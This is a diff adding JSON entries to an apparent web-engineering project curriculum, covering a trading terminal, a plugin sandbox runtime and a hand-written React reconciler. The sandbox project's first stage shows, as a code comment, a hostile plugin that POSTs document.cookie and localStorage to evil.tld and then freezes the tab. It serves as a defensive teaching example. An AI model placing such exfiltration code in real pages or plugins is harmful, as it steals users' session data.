+            "Zero heap allocations during steady-state 120 FPS loops."
+          ]
+        }
+      ],
+      "teaches": [
+        {
+          "category": "React 19",
+          "topic": "useOptimistic",
+          "subtopic": "Real-Time Shape Transforms",
+          "howCovered": "Instantly applies shape transforms and layer orders before peer confirmation.",
+          "conceptIds": [
+            "r19-actions",
+            "react-state"
+          ]
+        },
+        {
+          "category": "Performance",
+          "topic": "INP & Long Tasks",
+          "subtopic": "OffscreenCanvas Offloading",
+          "howCovered": "Offloads all vector math and draw calls to Web Workers via OffscreenCanvas.",
+          "conceptIds": [
+            "react-perf",
+            "web-how-page-loads"
+          ]
+        },
+        {
+          "category": "Web Platform",
+          "topic": "Web Workers",
+          "subtopic": "Zero-Copy Transferables",
+          "howCovered": "Transfers ArrayBuffers without cloning between UI and render workers.",
+          "conceptIds": [
+            "react-references-copying",
+            "js-event-loop"
+          ]
+        },
+        {
+          "category": "CSS",
+          "topic": "Modern CSS",
+          "subtopic": "Subgrid & Container Queries",
+          "howCovered": "Property inspector aligned via CSS Subgrid with @container adaptive cards.",
+          "conceptIds": [
+            "css-tokens-modern",
+            "css-media-container"
+          ]
+        }
+      ],
+      "implicitFoundations": [
+        {
+          "domain": "Internet & Protocols",
+          "title": "WebSocket Binary Framing",
+          "mechanism": "Protobuf binary encoding over raw TCP.",
+          "realWorldImpact": "Reduces network packet payload by 80% compared to JSON."
+        },
+        {
+          "domain": "V8 Engine & Memory",
+          "title": "V8 Heap Nursery Bypassing",
+          "mechanism": "Float32Array static memory pooling.",
+          "realWorldImpact": "Zero GC pauses during 120 FPS high-frequency dragging."
+        },
+        {
+          "domain": "DOM & Browser Pipeline",
+          "title": "Compositor Layer Promotion",
+          "mechanism": "will-change: transform on viewport container.",
+          "realWorldImpact": "Eliminates layout and paint reflows during zoom."
+        },
+        {
+          "domain": "Security & Invariants",
+          "title": "SVG Vector Sanitization",
+          "mechanism": "DOMPurify sanitization on imported SVG vectors.",
+          "realWorldImpact": "Prevents stored XSS payloads in shared whiteboard sessions."
+        }
+      ],
+      "frameworkVsManual": {
+        "frameworkHandled": [
+          "React Fiber scheduling for tool chrome.",
+          "Synthetic event delegation on overlay controls."
+        ],
+        "manualEngineeringRequired": [
+          "WebGL2 shaders and Mat3x3 matrix math.",
+          "BVH spatial tree indexing in Web Workers.",
+          "Binary CRDT vector synchronization."
+        ]
+      },
+      "conceptIds": [
+        "r19-actions",
+        "react-state",
+        "react-perf",
+        "web-how-page-loads",
+        "react-references-copying",
+        "js-event-loop",
+        "css-tokens-modern",
+        "css-media-container"
+      ],
+      "tags": [
+        "webgl",
+        "offscreencanvas",
+        "crdts",
+        "websockets",
+        "web workers",
+        "spatial indexing",
+        "performance",
+        "forms"
+      ]
+    },
+    {
+      "id": "project-quantumtrade",
+      "kind": "project",
+      "tier": "advanced",
+      "difficulty": "Principal",
+      "title": "QuantumTrade: High-Frequency Order Book & Telemetry Terminal",
+      "tagline": "Institutional-grade real-time market depth terminal processing 250k events/sec with zero GC stutter.",
+      "realWorldAnalog": "Bloomberg Terminal / Binance Pro / TradingView L2 Book",
+      "architecturePattern": "Hexagonal + Lock-Free SPSC Circular Rings + WASM Book Kernel",
+      "essence": "Build a high-frequency financial terminal processing 250,000 depth updates per second with sub-16ms end-to-end glass latency. Minimal scope (single L2 book, depth heatmap, one-click order form) with maximum architectural depth: SharedArrayBuffer, Atomics SPSC ring, fixed-point Int64 math, and useSyncExternalStore.",
+      "estimatedBuildTimeHours": 16,
+      "xp": 500,
+      "prerequisites": [],
+      "inScope": [
+        "250,000 events/sec binary feed ingestion in dedicated Web Worker.",
+        "Lock-Free SPSC circular ring on 10MB SharedArrayBuffer with Atomics.",
+        "120Hz coalesced WebGL2 liquidity depth heatmap.",
+        "Fixed-point scaled integer arithmetic (Price * 10^8).",
+        "React 19 useSyncExternalStore tear-free subscription."
+      ],
+      "outOfScope": [
+        "Multi-exchange brokerage OAuth logins.",
+        "10-year historical candlestick backtesting engine.",
+        "Complex tax and multi-currency accounting ledgers.",
+        "Social chat rooms and trader leaderboards."
+      ],
+      "stages": [
+        {
+          "stageNumber": 1,
+          "stageName": "Minimal Working Prototype",
+          "focus": "React State Order Book & JSON WebSocket",
+          "codeSnippet": "// Stage 1: Naïve JSON Feed & React State\nfunction NaiveOrderBook() {\n  const [bids, setBids] = useState<Record<number, number>>({});\n\n  useEffect(() => {\n    ws.onmessage = (event) => {\n      const data = JSON.parse(event.data); // JSON parse overhead\n      setBids(prev => ({ ...prev, [data.price]: data.qty })); // Object clone nursery churn\n    };\n  }, []);\n\n  return <table>{Object.entries(bids).map(([p, q]) => <tr key={p}><td>{p}</td><td>{q}</td></tr>)}</table>;\n}",
+          "failureModeOrInvariant": "Parsing 250,000 JSON messages/sec generates 50MB/s of ephemeral objects, triggering frequent 80ms V8 Stop-The-World GC pauses.",
+          "architecturalLesson": "High-velocity market feeds cannot use JSON or React state directly. Ingestion must be zero-copy and decoupled from UI render ticks."
+        },
+        {
+          "stageNumber": 2,
+          "stageName": "The Production Breakdown",
+          "focus": "IEEE-754 Float Precision Loss & Concurrent State Tearing",
+          "codeSnippet": "// Stage 2: Float Math & State Tearing Under Concurrency\nfunction calculateVWAP(orders: Order[]) {\n  // 0.1 + 0.2 === 0.30000000000000004 IEEE-754 rounding drift\n  return orders.reduce((acc, o) => acc + (o.price * o.qty), 0) / totalQty;\n}\n\n// Concurrent React render tear: numbers update mid-frame\nconst depth = useStore(s => s.depth);",
+          "failureModeOrInvariant": "IEEE-754 binary floating point introduces rounding inaccuracies in financial matching. High-frequency state updates cause visual UI tearing.",
+          "architecturalLesson": "Financial engines must use 64-bit fixed-point integers and tear-free subscription contracts like useSyncExternalStore."
+        },
+        {
+          "stageNumber": 3,
+          "stageName": "The Canonical Concept Evolution",
+          "focus": "Zero-Copy SBE + SharedArrayBuffer Atomics Ring + useSyncExternalStore",
+          "codeSnippet": "// Stage 3: SharedArrayBuffer Lock-Free SPSC Ring\n// Feed Worker (Producer)\nconst writeIdx = Number(Atomics.load(headPtr, 0) & BigInt(RING_CAPACITY - 1)) * 16;\nringView.setBigInt64(writeIdx, priceScaledInt64, true);\nringView.setBigInt64(writeIdx + 8, volumeScaledInt64, true);\nAtomics.add(headPtr, 0, 1n);\nAtomics.notify(headPtr, 0, 1);\n\n// React 19 UI: Tear-Free useSyncExternalStore\nexport function useDepth(symbol: string) {\n  return useSyncExternalStore(\n    notify => ringStore.subscribe(symbol, notify),\n    () => ringStore.getSnapshot(symbol)\n  );\n}",
+          "failureModeOrInvariant": "Zero heap allocations during steady-state ingestion. Ingestion and rendering execute concurrently across multi-core workers without locks.",
+          "architecturalLesson": "SharedArrayBuffer with atomic memory barriers enables true zero-latency inter-thread streaming in the browser."
+        },
+        {
+          "stageNumber": 4,
+          "stageName": "Production Hardening & Design Elegance",
+          "focus": "64-Byte Cache-Line Padding, WebGL PBO Heatmap & CSS Containment",
+          "codeSnippet": "// Stage 4: 64-Byte Cache-Line False Sharing Padding\n// Align atomic pointers to distinct 64-byte hardware cache lines\nconst HEAD_PTR_OFFSET = 0;\nconst TAIL_PTR_OFFSET = 64; // Prevents CPU L1/L2 cache invalidation storms\n\n// CSS Strict Containment on Terminal Widget\n// .market-ladder { contain: strict; content-visibility: auto; }",
+          "failureModeOrInvariant": "Eliminates multi-core CPU cache line thrashing. CSS containment isolates 120 FPS high-density canvas updates from document reflows.",
+          "architecturalLesson": "Hardware-aware data layout and CSS containment are required for true sub-16ms institutional terminal performance."
+        }
+      ],
+      "layers": [
+        {
+          "layer": "Presentation",
+          "components": [
+            "React 19 Shell",
+            "OffscreenCanvas Price Ladder",
+            "WebGL Liquidity Heatmap",
+            "Risk Validator"
+          ],
+          "invariants": [
+            "Tear-free subscriptions via useSyncExternalStore; zero DOM re-render during ticks."
+          ]
+        },
+        {
+          "layer": "Application",
+          "components": [
+            "120Hz Coalescing Scheduler",
+            "SPSC Ring Coordinator",
+            "VWAP Fixed-Point Engine"
+          ],
+          "invariants": [
+            "Aggregates 250k events/sec into 120Hz display tick slices."
+          ]
+        },
+        {
+          "layer": "Domain",
+          "components": [
+            "L2 Order Book Entity",
+            "Int64 Fixed-Point Value Object",
+            "Trade Tape Ring"
+          ],
+          "invariants": [
+            "Prices represented as scaled 64-bit integers (Price * 10^8)."
+          ]
+        },
+        {
+          "layer": "Infrastructure",
+          "components": [
+            "Binary Feed Worker",
+            "SharedArrayBuffer SPSC Queue",
+            "WebGL PBO Texture Uploader"
+          ],
+          "invariants": [
+            "Zero-copy byte deserialization with DataView directly over network ArrayBuffers."
+          ]
+        }
+      ],
+      "teaches": [
+        {
+          "category": "React 19",
+          "topic": "useSyncExternalStore",
+          "subtopic": "Tear-Free Subscriptions",
+          "howCovered": "Subscribes directly to memory-mapped binary state store with zero UI tearing.",
+          "conceptIds": [
+            "react-hooks-rest",
+            "state-alternatives"
+          ]
+        },
+        {
+          "category": "Performance",
+          "topic": "Zero-Allocation Invariants",
+          "subtopic": "V8 Nursery Bypassing",
+          "howCovered": "Static memory pre-allocation eliminates 100% of V8 young-generation GC pauses.",
+          "conceptIds": [
+            "react-perf",
+            "js-arrays-objects"
+          ]
+        },
+        {
+          "category": "Web Platform",
+          "topic": "SharedArrayBuffer & Atomics",
+          "subtopic": "Lock-Free SPSC Queue",
+          "howCovered": "Multi-threaded lock-free communication between ingestion worker and render worker.",
+          "conceptIds": [
+            "js-event-loop",
+            "js-promises"
+          ]
+        },
+        {
+          "category": "Security & Invariants",
+          "topic": "Cross-Origin Isolation",
+          "subtopic": "COOP & COEP Headers",
+          "howCovered": "Configures COOP same-origin headers to unlock SharedArrayBuffer.",
+          "conceptIds": [
+            "web-cors",
+            "web-security"
+          ]
+        }
+      ],
+      "implicitFoundations": [
+        {
+          "domain": "Internet & Protocols",
+          "title": "TCP_NODELAY & Nagle Bypassing",
+          "mechanism": "Raw binary WebSockets with disabled packet coalescing.",
+          "realWorldImpact": "Eliminates 40ms of socket packet buffering latency."
+        },
+        {
+          "domain": "V8 Engine & Memory",
+          "title": "Generational GC Hypothesis",
+          "mechanism": "Zero dynamic object allocations in steady-state loop.",
+          "realWorldImpact": "Prevents full-stop GC freezes during high-volume market bursts."
+        },
+        {
+          "domain": "DOM & Browser Pipeline",
+          "title": "Layout Containment (contain: strict)",
+          "mechanism": "Strict CSS layout containment on terminal widget.",
+          "realWorldImpact": "Prevents parent document reflow triggers during 120 FPS rendering."
+        },
+        {
+          "domain": "Security & Invariants",
+          "title": "64-Byte Cache-Line Padding",
+          "mechanism": "Aligns atomic pointers to distinct hardware cache lines.",
+          "realWorldImpact": "Eliminates multi-core CPU cache invalidation storms."
+        }
+      ],
+      "frameworkVsManual": {
+        "frameworkHandled": [
+          "React concurrent scheduler for order inputs.",
+          "Accessibility focus rings for trading keybindings."
+        ],
+        "manualEngineeringRequired": [
+          "Lock-free SPSC ring buffer with Atomics synchronization.",
+          "Direct DataView binary parsing and fixed-point math.",
+          "WebGL2 PBO texture depth upload loop."
+        ]
+      },
+      "conceptIds": [
+        "react-hooks-rest",
+        "state-alternatives",
+        "react-perf",
+        "js-arrays-objects",
+        "js-event-loop",
+        "js-promises",
+        "web-cors",
+        "web-security"
+      ],
+      "tags": [
+        "high frequency",
+        "sharedarraybuffer",
+        "wasm",
+        "webgl",
+        "binary websockets",
+        "spsc rings",
+        "state",
+        "forms"
+      ]
+    },
+    {
+      "id": "adv-sandbox-runtime",
+      "kind": "project",
+      "tier": "advanced",
+      "difficulty": "Principal",
+      "title": "A Plugin Runtime That Executes Code You Do Not Trust",
+      "tagline": "Third-party plugins, in your page, with your user session — and no path to their data.",
+      "realWorldAnalog": "Figma plugins / Shopify checkout extensions",
+      "architecturePattern": "Capability-based sandbox: null-origin iframe + worker + RPC membrane",
+      "essence": "Build a runtime that lets untrusted plugin code render UI and call host APIs, where a hostile plugin cannot read the session, exfiltrate data, or freeze the page. The security model is the entire project: every capability a plugin holds must be one you deliberately handed it, and the interesting failures are the ones that look safe.",
+      "estimatedBuildTimeHours": 20,
+      "xp": 520,
+      "prerequisites": [
+        "inter-designed-dashboard"
+      ],
+      "inScope": [
+        "Plugin execution in a null-origin sandboxed iframe hosting a Worker.",
+        "A structured RPC membrane — no host object ever crosses the boundary.",
+        "A capability manifest: a plugin receives exactly the APIs it declared.",
+        "A watchdog that terminates a plugin exceeding its time or memory budget."
+      ],
+      "outOfScope": [
+        "A plugin marketplace, billing, or review pipeline.",
+        "A custom JavaScript interpreter — the platform already isolates.",
+        "Server-side plugin execution."
+      ],
+      "stages": [
+        {
+          "stageNumber": 1,
+          "stageName": "eval and good intentions",
+          "focus": "Running plugin code in the host realm",
+          "codeSnippet": "const fn = new Function('host', pluginSource);\nfn(hostApi);            // plugin now shares your realm\n\n// A three-line hostile plugin:\n// fetch('https://evil.tld', { method: 'POST',\n//   body: JSON.stringify({ c: document.cookie, s: localStorage }) });\n// while (true) {}   // and the tab is gone",
+          "failureModeOrInvariant": "The plugin has the host origin, so it holds the session cookie, localStorage, the DOM and every fetch credential. An infinite loop freezes the main thread. Freezing prototypes does not help — the plugin can reach the same globals through any object it is handed.",
+          "architecturalLesson": "Isolation is a property of the realm and the origin, not of how carefully you pass objects. Same realm means no isolation at all."
+        },
+        {
+          "stageNumber": 2,
+          "stageName": "A boundary the platform enforces",
+          "focus": "Null-origin iframe, worker realm, CSP, postMessage only",
+          "codeSnippet": "<iframe sandbox=\"allow-scripts\"          <!-- no allow-same-origin: null origin -->\n        csp=\"default-src 'none'; script-src 'unsafe-inline'\"\n        src=\"data:text/html,...\"></iframe>\n\n// Inside: the plugin runs in a Worker, so it cannot touch even that DOM\nworker.postMessage({ type: 'render', props: structuredClone(safeProps) });\n// structuredClone throws on functions — accidental capability leaks fail loudly",
+          "failureModeOrInvariant": "The plugin realm has a null origin, so it shares no storage, no cookies and no DOM with the host. A runaway loop blocks only its own worker thread. Crucially, `allow-scripts` together with `allow-same-origin` would silently undo all of this — the two flags together are equivalent to no sandbox.",
+          "architecturalLesson": "structuredClone as the only transport is a design choice, not a limitation: if a value cannot be cloned it cannot be a capability leak."
+        },
+        {
+          "stageNumber": 3,
+          "stageName": "Capabilities, not permissions",
+          "focus": "A membrane that hands out revocable, narrow references",
+          "codeSnippet": "// The plugin never receives an object — only a token it can call back with\nconst grant = capabilities.issue(pluginId, 'storage:read', { keys: ['prefs'] });\n\nonMessage(({ cap, method, args }) => {\n  const grant = registry.resolve(cap);            // unknown token: reject\n  if (!grant || grant.revoked) return deny();\n  if (!grant.allows(method, args)) return deny(); // arguments checked, not just method\n  return grant.invoke(method, args);\n});",
+          "failureModeOrInvariant": "A plugin granted storage:read for `prefs` cannot read `session` by passing a different key, because the grant validates arguments and not merely the method name. Revoking a grant takes effect on the next call with no plugin cooperation.",
+          "architecturalLesson": "A permission is a question asked at the boundary; a capability is an unforgeable reference. Capabilities compose and revoke cleanly, which is why every real plugin system converges on them."
+        },
+        {
+          "stageNumber": 4,
+          "stageName": "Budgets and blast radius",
+          "focus": "Watchdogs, rendering untrusted trees, telemetry per plugin",
+          "codeSnippet": "// The host owns the DOM; plugins describe it and never touch it\nconst tree = PluginNodeSchema.parse(message.tree);   // reject unknown node types\n\n// Time budget enforced from the host, since the worker cannot police itself\nconst deadline = setTimeout(() => worker.terminate(), 32);\n// href/src are validated against an allowlist: javascript: is a script tag",
+          "failureModeOrInvariant": "A plugin returning a node with an onClick string, a javascript: href, or an unknown type is rejected at the schema rather than rendered. A plugin missing its 32ms frame budget is terminated and shown as degraded, not allowed to drop frames for everyone.",
+          "architecturalLesson": "Untrusted UI is data describing a tree, never markup. The host decides what a described node is permitted to become."
+        }
+      ],
+      "layers": [
+        {
+          "layer": "Host",
+          "components": [
+            "capability registry",
+            "RPC router",
+            "watchdog",
+            "plugin surface renderer"
+          ],
+          "invariants": [
+            "No host object reference ever crosses the postMessage boundary."
+          ]
+        },
+        {
+          "layer": "Boundary",
+          "components": [
+            "null-origin iframe",
+            "per-plugin Worker",
+            "structured-clone transport",
+            "CSP"
+          ],
+          "invariants": [
+            "allow-scripts and allow-same-origin are never set together."
+          ]
+        },
+        {
+          "layer": "Plugin",
+          "components": [
+            "plugin SDK shim",
+            "declared capability manifest"
+          ],
+          "invariants": [
+            "A plugin holds only capabilities its manifest declared and the user approved."
+          ]
+        }
+      ],
+      "teaches": [
+        {
+          "category": "Web Platform",
+          "topic": "Security",
+          "subtopic": "XSS, CSRF, clickjacking and CSP",
+          "howCovered": "The threat model is written first; CSP, sandbox flags and URL-scheme validation are each defeated then fixed.",
+          "conceptIds": [
+            "web-security"
+          ]
+        },
+        {
+          "category": "Web Platform",
+          "topic": "Network",
+          "subtopic": "Same-origin policy, origins and CORS",
+          "howCovered": "The null-origin iframe makes the same-origin policy the enforcement mechanism rather than a footnote.",
+          "conceptIds": [
+            "web-cors"
+          ]
+        },
+        {
+          "category": "Web Platform",
+          "topic": "Storage",
+          "subtopic": "Origin-partitioned storage",
+          "howCovered": "Demonstrates that a null-origin frame shares no cookies, localStorage or IndexedDB with the host.",
+          "conceptIds": [
+            "web-storage"
+          ]
+        },
+        {
+          "category": "JavaScript",
+          "topic": "Data",
+          "subtopic": "Structured clone vs references",
+          "howCovered": "structuredClone is used as the only transport precisely because it cannot carry a function.",
+          "conceptIds": [
+            "react-references-copying",
+            "js-arrays-objects"
+          ]
+        },
+        {
+          "category": "TypeScript",
+          "topic": "Types",
+          "subtopic": "Runtime validation at a trust boundary",
+          "howCovered": "Every inbound message is schema-parsed, since a type annotation is erased and proves nothing at runtime.",
+          "conceptIds": [
+            "ts-essentials"
+          ]
+        }
+      ],
+      "implicitFoundations": [
+        {
+          "domain": "Security & Invariants",
+          "title": "Realms and origins",
+          "mechanism": "Each browsing context has its own realm and intrinsics; the origin tuple gates storage and DOM access.",
+          "realWorldImpact": "Explains why object-freezing defences fail and platform isolation does not.",
+          "conceptIds": [
+            "web-security",
+            "web-cors"
+          ]
+        },
+        {
+          "domain": "V8 Engine & Memory",
+          "title": "Thread isolation",
+          "mechanism": "A Worker has its own event loop and heap; terminate() reclaims both immediately.",
+          "realWorldImpact": "A hostile infinite loop costs one worker rather than the user’s tab.",
+          "conceptIds": [
+            "js-event-loop"
+          ]
+        }
+      ],
+      "frameworkVsManual": {
+        "frameworkHandled": [
+          "Browser-enforced origin isolation",
+          "structuredClone serialisation"
+        ],
+        "manualEngineeringRequired": [
+          "The capability registry, the membrane and the revocation model.",
+          "The threat model document, written before any code.",
+          "Schema validation of every untrusted UI tree."
+        ]
+      },
+      "conceptIds": [
+        "web-security",
+        "web-cors",
+        "web-storage",
+        "react-references-copying",
+        "js-arrays-objects",
+        "ts-essentials"
+      ],
+      "tags": [
+        "security",
+        "sandboxing",
+        "workers",
+        "csp",
+        "principal",
+        "rendering",
+        "tooling"
+      ]
+    },
+    {
+      "id": "adv-react-from-scratch",
+      "kind": "project",
+      "tier": "advanced",
+      "difficulty": "Principal",
+      "title": "Write React: Fiber, Hooks and a Reconciler of Your Own",
+      "tagline": "A working renderer with interruptible rendering and a real hook dispatcher, in one repo.",
+      "realWorldAnalog": "React’s own reconciler package",
+      "architecturePattern": "Fiber linked list + work loop + double buffering + hook slot array",
+      "essence": "Implement a renderer: JSX to elements, elements to a fiber tree, a work loop that yields to the browser, a commit phase, and hooks backed by a per-fiber slot array. Once you have written the dispatcher, every hook rule stops being a rule you memorised and becomes an obvious consequence of an array and an index.",
+      "estimatedBuildTimeHours": 24,
+      "xp": 560,
+      "prerequisites": [
+        "inter-perf-audit",
+        "inter-utility-belt"
+      ],
+      "inScope": [
+        "createElement, a fiber tree, and a work loop driven by a deadline.",
+        "Reconciliation by type and key, with placement, update and deletion effects.",
+        "useState and useEffect backed by a hook slot array on the fiber.",
+        "A commit phase separated from render, with double buffering."
+      ],
+      "outOfScope": [
+        "Concurrent lanes, transitions and Suspense — name them, do not build them.",
+        "Server rendering or hydration.",
+        "Matching React’s API surface beyond the four exports above."
+      ],
+      "stages": [
+        {
+          "stageNumber": 1,
+          "stageName": "Recursive render",
+          "focus": "Straight recursion into the DOM",
+          "codeSnippet": "function render(element, container) {\n  const dom = document.createElement(element.type);\n  element.props.children.forEach(c => render(c, dom));  // cannot be paused\n  container.appendChild(dom);                            // mutates as it goes\n}",
+          "failureModeOrInvariant": "A 10,000-node tree blocks the main thread for the entire traversal, so no input is handled until it finishes. Because the DOM is mutated during traversal, an error halfway leaves a half-built UI on screen.",
+          "architecturalLesson": "Recursion cannot be interrupted — the call stack is the traversal state. Making rendering pausable requires the traversal state to live in a data structure you control."
+        },
+        {
+          "stageNumber": 2,
+          "stageName": "The fiber loop",
+          "focus": "A linked list, a unit of work, and yielding to the browser",
+          "codeSnippet": "function workLoop(deadline) {\n  while (nextUnitOfWork && deadline.timeRemaining() > 1) {\n    nextUnitOfWork = performUnitOfWork(nextUnitOfWork);  // one fiber at a time\n  }\n  if (!nextUnitOfWork && wipRoot) commitRoot();          // commit is atomic\n  requestIdleCallback(workLoop);\n}\n\n// child -> sibling -> return: the traversal is data, so it can be resumed\nfiber.child; fiber.sibling; fiber.return;",
+          "failureModeOrInvariant": "Rendering yields between fibers, so typing stays responsive during a large update. Nothing reaches the DOM until the whole tree is ready, so a partial tree is never visible.",
+          "architecturalLesson": "The render phase is pure and interruptible; the commit phase is synchronous and cannot be. That split is the reason effects run when they do."
+        },
+        {
+          "stageNumber": 3,
+          "stageName": "Reconciliation and keys",
+          "focus": "Diffing by type and key, alternate fibers, double buffering",
+          "codeSnippet": "if (sameType) {\n  newFiber = { ...element, dom: oldFiber.dom, alternate: oldFiber, effectTag: 'UPDATE' };\n} else if (element) {\n  newFiber = { ...element, dom: null, effectTag: 'PLACEMENT' };\n} else {\n  oldFiber.effectTag = 'DELETION';\n}\n// Index keys: reorder the list and state follows position, not identity.",
+          "failureModeOrInvariant": "With index keys, reordering a list of inputs leaves the typed values attached to the wrong rows — the fiber matched by position, so state stayed with position. With stable keys the state follows the item.",
+          "architecturalLesson": "The key is what tells the reconciler that two fibers across renders are the same thing. Every \"why is my list state wrong\" bug is this one sentence."
+        },
+        {
+          "stageNumber": 4,
+          "stageName": "The hook dispatcher",
+          "focus": "A slot array indexed by call order",
+          "codeSnippet": "let wipFiber = null, hookIndex = 0;\n\nfunction useState(initial) {\n  const old = wipFiber.alternate?.hooks?.[hookIndex];\n  const hook = { state: old ? old.state : initial, queue: [] };\n  (old?.queue ?? []).forEach(a => { hook.state = a(hook.state); });  // updaters replay\n  wipFiber.hooks[hookIndex++] = hook;                                // ORDER is the identity\n  return [hook.state, action => { hook.queue.push(action); scheduleRoot(); }];\n}",
+          "failureModeOrInvariant": "A hook inside an `if` shifts every subsequent index, so useState(2) reads the slot belonging to useEffect. The state does not just go wrong — it becomes a different hook’s state.",
+          "architecturalLesson": "The rules of hooks are not a style guide. Call order is the only identity a hook has, and this is why `use()` — which is not slot-backed — is the one hook allowed to be conditional."
+        }
+      ],
+      "layers": [
+        {
+          "layer": "Elements",
+          "components": [
+            "createElement",
+            "JSX pragma",
+            "TEXT_ELEMENT"
+          ],
+          "invariants": [
+            "An element is an immutable description; it holds no DOM node."
+          ]
+        },
+        {
+          "layer": "Render phase",
+          "components": [
+            "fiber node",
+            "work loop",
+            "reconcileChildren",
+            "effect tags"
+          ],
+          "invariants": [
+            "The render phase performs no DOM mutation and may be abandoned at any point."
+          ]
+        },
+        {
+          "layer": "Commit phase",
+          "components": [
+            "commitRoot",
+            "effect list walk",
+            "alternate pointer swap"
+          ],
+          "invariants": [
+            "Commit is synchronous and applies the whole tree or none of it."
+          ]
+        },
+        {
+          "layer": "Hooks",
+          "components": [
+            "dispatcher",
+            "per-fiber hook array",
+            "update queue"
+          ],
+          "invariants": [
+            "Hook order is identical on every render of a given fiber."
+          ]
+        }
+      ],
+      "teaches": [
+        {
+          "category": "React Core",
+          "topic": "Mental model",
+          "subtopic": "Fiber, the work loop, double buffering and reconciliation",
+          "howCovered": "The fiber tree, the yielding work loop and the alternate-pointer swap are all implemented by hand.",
+          "conceptIds": [
+            "react-rendering-model"
+          ]
+        },
+        {
+          "category": "React Core",
+          "topic": "State",
+          "subtopic": "Batching, updaters and closure capture",
+          "howCovered": "The update queue is built, showing directly why an updater sees the pending value and a variable does not.",
+          "conceptIds": [
+            "react-state"
+          ]
+        },
+        {
+          "category": "React Core",
+          "topic": "Hooks",
+          "subtopic": "The dispatcher, slot arrays and the rules of hooks",
+          "howCovered": "useState and useEffect are implemented on an index-addressed array, deriving the rules rather than citing them.",
+          "conceptIds": [
+            "react-effects",
+            "react-hooks-rest"
+          ]
+        },
+        {
+          "category": "React 19",
+          "topic": "Server & rendering",
+          "subtopic": "Why use() may be called conditionally",
+          "howCovered": "With the slot array built, the exception for use() follows from it not being slot-backed.",
+          "conceptIds": [
+            "r19-use-rsc"
+          ]
+        },
+        {
+          "category": "React Advanced",
+          "topic": "Performance",
+          "subtopic": "Why memo works and what it compares",
+          "howCovered": "A bailout is added to the reconciler, making the shallow prop comparison something you wrote.",
+          "conceptIds": [
+            "react-perf"
+          ]
+        }
+      ],
+      "implicitFoundations": [
+        {
+          "domain": "DOM & Browser Pipeline",
+          "title": "Cooperative scheduling",
+          "mechanism": "requestIdleCallback and the 5ms frame budget let long work yield between units.",
+          "realWorldImpact": "This is the mechanism concurrent React generalises into lanes and priorities.",
+          "conceptIds": [
+            "js-event-loop",
+            "web-how-page-loads"
+          ]
+        },
+        {
+          "domain": "V8 Engine & Memory",
+          "title": "Double buffering",
+          "mechanism": "Two fiber trees alternate; the previous tree is reused rather than reallocated.",
+          "realWorldImpact": "Keeps allocation flat across renders, which is why React does not thrash the young generation.",
+          "conceptIds": [
+            "react-rendering-model"
+          ]
+        },
+        {
+          "domain": "Tooling & Build",
+          "title": "The JSX transform",
+          "mechanism": "Babel or the automatic runtime rewrites JSX into createElement or jsx() calls.",
+          "realWorldImpact": "Makes clear that JSX is syntax over a function call, not a template language.",
+          "conceptIds": [
+            "tooling-bundlers",
+            "js-modules"
+          ]
+        }
+      ],
+      "frameworkVsManual": {
+        "frameworkHandled": [
+          "The JSX transform, configured to your own pragma"
+        ],
+        "manualEngineeringRequired": [
+          "The reconciler, the scheduler, the commit phase and the hook dispatcher.",
+          "A test proving state follows keys and not positions."
+        ]
+      },
+      "conceptIds": [
+        "react-rendering-model",
+        "react-state",
+        "react-effects",
+        "react-hooks-rest",
+        "r19-use-rsc",
+        "react-perf"
+      ],
+      "tags": [
+        "react internals",
+        "fiber",
+        "reconciliation",
+        "scheduling",
+        "principal",
+        "rendering",
+        "performance",
+        "hooks"
+      ]
+    }
+  ],
+  "projectTiers": {
+    "basic": {
+      "label": "Foundations",
+      "blurb": "Small builds that make one mechanism impossible to forget.",
+      "audience": "0-3 YOE · what an OA and a first technical round actually ask"
+    },
+    "intermediate": {
+      "label": "Working Engineer",
+      "blurb": "Real applications where the failure modes are the lesson.",
+      "audience": "2-5 YOE · the round where they ask why, not what"
+    },
+    "advanced": {
+      "label": "The Dare",
+      "blurb": "Architectures that only work if the invariants hold.",
+      "audience": "Staff & Principal · nobody expects you to finish these"
+    }
   },
   "resources": [
     {
